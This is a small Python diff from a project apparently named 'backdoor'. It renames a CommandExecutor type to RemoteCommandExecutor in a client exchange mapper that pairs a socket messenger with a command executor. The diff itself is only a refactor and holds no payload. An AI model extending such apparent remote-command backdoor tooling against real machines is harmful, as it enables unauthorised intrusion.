@@ -1,11 +1,13 @@
-from backdoor.command.executor import CommandExecutor
+from backdoor.command.executor import RemoteCommandExecutor
 from backdoor.messages.messenger import SocketMessenger
 from backdoor.models.server import ServerModel
 
 
 class ClientExchangeMapper:
 
-    def __init__(self, messenger: SocketMessenger, executor: CommandExecutor) -> None:
+    def __init__(
+        self, messenger: SocketMessenger, executor: RemoteCommandExecutor
+    ) -> None:
         self.messenger = messenger
         self.executor = executor
 
